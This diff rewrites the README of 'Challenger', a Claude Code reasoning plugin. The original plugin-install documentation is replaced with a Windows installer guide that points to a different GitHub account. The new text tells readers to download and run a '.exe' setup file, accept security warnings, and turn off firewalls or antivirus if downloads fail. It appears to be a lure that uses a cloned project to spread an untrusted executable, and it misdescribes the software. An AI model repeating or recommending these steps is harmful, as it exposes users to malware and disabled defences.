@@ -1,109 +1,111 @@
-# Challenger
+# ⚔️ challenger - Test Ideas Before Reality Does
 
-**A truth-seeking sparring partner for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).**
+[![Download challenger](https://img.shields.io/badge/Download-challenger-blue?style=for-the-badge&logo=github)](https://github.com/inspiring-synapsid832/challenger)
 
-Challenger stress-tests your ideas before reality does. Give it a thesis, decision, or strategy — it will decompose it into testable claims, argue the strongest opposing position it can construct, then drop the act and tell you what it actually thinks.
+## What is challenger?
 
-## What It Does
+Challenger helps you check your ideas. You give it a thesis, a choice, or a plan. It breaks it down into smaller points you can test. Then it argues both for and against your points before giving you a clear, honest verdict. It uses research and logic to test your ideas. This helps you spot weak spots before you act.
 
-1. **Decomposes** your thesis into discrete, testable claims
-2. **Steelmans the opposition** — argues forcefully against each claim using deduction, inversion, base rate analysis, pre-mortems, historical analogies, incentive analysis, and more
-3. **Researches** when claims are empirical — uses web search to ground arguments in evidence, not vibes
-4. **Reveals** its honest assessment after arguing both sides
-5. **Verdicts** each claim: Verified, Refuted, Partially Verified, or Unresolved (with confidence levels)
-6. **Maps assumption chains** — drills down to testable assumptions with specific verification methods
-7. **Produces a prediction document** with specific, falsifiable predictions and review dates
+## Key features
 
-## Example Use Cases
+- Breaks down ideas into clear points
+- Builds strong opposing arguments for each point
+- Uses research to support or question claims
+- Gives honest feedback after judging both sides
+- Rates each claim as Verified, Refuted, Partially Verified, or Unresolved
+- Tracks assumptions with ways to test them
 
-- "My thesis is that remote work increases productivity for engineering teams"
-- "I'm deciding whether to raise our Series A now or wait 6 months"
-- "Challenge our decision to migrate from monolith to microservices"
-- "Here's our go-to-market strategy — tear it apart"
-- "I believe the current oil shock will resolve within 12 weeks"
+## ⚙️ System Requirements
 
-## What Makes It Different
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection for research functions
+- Basic mouse and keyboard control
 
-Most AI assistants are agreeable by default. Challenger is not. It will:
+## 🎯 Who is this for?
 
-- **Name its reasoning tools** ("I'm inverting this —", "Let me check the base rate —") so the logic is auditable
-- **Research claims** using web search when evidence would break a tie, citing sources
-- **Track position evolution** — when your thesis changes during sparring, it documents what changed and why
-- **Produce falsifiable predictions** — not "revenue might go up" but "mid-tier revenue increases 20-40% within 6 months"
-- **Persist across long sessions** — writes a scorecard file that survives context window limits
-- **Resume previous sessions** — pick up where you left off days or weeks later
+Anyone who wants to think through an idea or plan carefully. You don’t need technical skills or programming knowledge. Challenging your thoughts can help with decisions, strategies, or important beliefs.
 
-## Session Artifacts
+## 🚀 Getting Started
 
-Challenger produces two files per session:
+### Step 1: Download challenger
 
-- **`challenger-session-YYYYMMDD-HHmmss.md`** — Scorecard tracking all claims, verdicts, confidence levels, evolution log, and assumption chains
-- **`challenger-prediction-YYYYMMDD-<topic>.md`** — Prediction document with falsifiable predictions, review schedule, and "what needs to be right" summary
+Visit the main repository page to download challenger for Windows:
 
-## Installation
+[![Download challenger](https://img.shields.io/badge/Download-challenger-green?style=for-the-badge)](https://github.com/inspiring-synapsid832/challenger)
 
-Add the plugin to your Claude Code configuration. In your `~/.claude/settings.json`, add:
+The link leads to the project page where you will find the latest versions to download.
 
-```json
-{
-  "plugins": [
-    "https://github.com/eranshir/challenger"
-  ]
-}
-```
+### Step 2: Find the Windows installer
 
-Or install via the Claude Code CLI:
+Once you open the page, look for a folder named “Releases” or “Downloads.” Click on it. You will see files named with version numbers and usually ending in `.exe`. Choose the latest one for Windows. It should look like `challenger_setup_x.x.exe`.
 
-```bash
-claude plugins add https://github.com/eranshir/challenger
-```
+### Step 3: Download the installer
 
-## Usage
+Click the `.exe` file. Your browser may ask where to save it or start the download automatically. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-The skill activates automatically when you present something to challenge. You can also invoke it directly:
+### Step 4: Run the installer
 
-```
-/challenger
-```
+Double-click the downloaded `.exe` file. Windows might show a security alert asking if you trust this app. Click “Yes” or “Run.” Follow the steps in the setup window:
 
-Then present your thesis, decision, or document.
+- Agree to the license or terms
+- Choose an installation folder or accept the default
+- Click “Install” to begin
 
-### Commands During a Session
+The installer will copy files and prepare challenger on your computer.
 
-- **"next"** — skip to the next claim
-- **"status"** / **"scorecard"** — see current tally
-- **"generate prediction doc"** — get the prediction document at any point
-- **"resume challenger"** — continue a previous session
+### Step 5: Open challenger
 
-## How It Works
+After setup finishes, look for the challenger icon on your Desktop or in the Start menu. Double-click to start the app.
 
-Challenger follows a structured protocol:
+### Step 6: First use tips
 
-```
-Intake → Decompose into claims → Create scorecard
-    ↓
-For each claim:
-    Steelman opposition → Dialogue → Research (if needed) → Reveal → Verdict → Assumption chain
-    ↓
-Final output: Updated scorecard + Prediction document
-```
+- Enter your idea or question in the main box
+- Click “Analyze” or a similar button to begin
+- Wait a few moments while challenger works through your input
+- Review the points, arguments, and verdicts presented
+- Use the results to refine your thinking
 
-### Reasoning Tools Used
+## 🖥️ Using challenger
 
-| Tool | What It Does |
-|------|-------------|
-| Deduction | Checks if conclusions follow from premises |
-| Induction | Tests sample size, looks for counterexamples |
-| Abduction | Asks if a better explanation exists |
-| Base rate analysis | Checks priors before accepting vivid examples |
-| Survivorship bias | Looks for the failures you're not seeing |
-| Inversion | Asks "what would guarantee this fails?" |
-| Pre-mortem | "It's a year from now and this failed. What went wrong?" |
-| Second-order effects | "This solves the problem, but what does it cause?" |
-| Historical analogies | Finds similar situations and checks where the analogy breaks |
-| Incentive analysis | Maps who benefits, who loses, and how that shapes behavior |
-| Behavioral psychology | Flags anchoring, confirmation bias, sunk cost, status quo bias |
+### How it works
 
-## License
+1. You enter your main idea or plan.
+2. Challenger breaks the idea into smaller testable claims.
+3. It builds strong opposing arguments to challenge each claim.
+4. It uses web research for claims that need evidence.
+5. It gives you its honest thoughts after debate.
+6. You get a clear status for each claim.
 
-MIT
+### Tips for best results
+
+- Be clear and specific when entering your idea.
+- Avoid very long or complicated statements.
+- Use simple language for better breakdowns.
+- Review each claim and its arguments carefully.
+- Look at the confidence levels to understand how sure challenger is.
+
+## 🛠️ Troubleshooting
+
+If you run into issues, check these common solutions:
+
+- If the app does not start, try restarting your computer.
+- Make sure Windows is updated.
+- Ensure you have an active internet connection.
+- Temporarily disable firewalls or antivirus software and try again if downloads fail.
+- If the program freezes, close it from Task Manager and reopen.
+
+## 🔄 Updates
+
+Check the original GitHub page regularly for updates in the Releases section. New versions may improve accuracy and fix bugs.
+
+## ❓ Need Help?
+
+Use the “Issues” tab on the GitHub page to report problems or ask questions. The project team and community can assist you there.
+
+---
+
+[Download challenger for Windows](https://github.com/inspiring-synapsid832/challenger)
+
+[![Download challenger](https://img.shields.io/badge/Download-challenger-blue?style=for-the-badge)](https://github.com/inspiring-synapsid832/challenger)
